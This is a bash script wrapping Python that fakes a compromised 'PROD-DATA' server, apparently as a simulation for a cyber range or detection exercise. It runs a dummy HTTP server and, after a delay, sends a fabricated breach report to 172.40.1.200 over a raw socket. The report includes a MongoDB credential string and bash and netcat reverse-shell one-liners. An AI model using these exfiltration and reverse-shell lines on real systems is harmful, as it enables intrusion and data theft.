#!/bin/bash

echo "PROD-DATA starting..."

python3 -c "
import http.server
import socketserver
import threading
import time
import json
import socket
import subprocess

class DataHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{\"deployment\":\"success\",\"data_access\":\"granted\"}')

def start_server():
    with socketserver.TCPServer(('', 8080), DataHandler) as httpd:
        httpd.serve_forever()

def data_exfil():
    time.sleep(35)
    
    data_info = {
        'server': 'PROD-DATA',
        'total_records_compromised': 4829384,
        'databases_accessed': ['customer_profiles', 'transaction_history', 'financial_analytics'],
        'mongodb_connection': 'mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod',
        'shell_upload_successful': True,
        'nc_listeners': ['4447', '4448', '4449'],
        'trojan_hash': 'tr0j4n_d4t4_789xyz',
        'trojan_implants': [
            {'name': 'db_trojan.so', 'hash': 'db_tr0j4n_hash_abcdef1234567890'},
            {'name': 'backup_service', 'hash': 'b4ckup_tr0j4n_9876543210fedcba'},
            {'name': 'log_monitor', 'hash': 'l0g_m0n1t0r_hash_567890abcdef1234'}
        ],
        'reverse_shells': [
            'bash -i >& /dev/tcp/172.40.1.200/4449 0>&1',
            'nc -e /bin/bash 172.40.1.200 4449'
        ],
        'persistence_methods': [
            'crontab_injection',
            'systemd_service_hijack', 
            'bashrc_modification'
        ]
    }
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.40.1.200', 4446))
        s.send(json.dumps(data_info).encode())
        s.close()
    except:
        pass

server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()

exfil_thread = threading.Thread(target=data_exfil)
exfil_thread.daemon = True
exfil_thread.start()

time.sleep(3600)
"
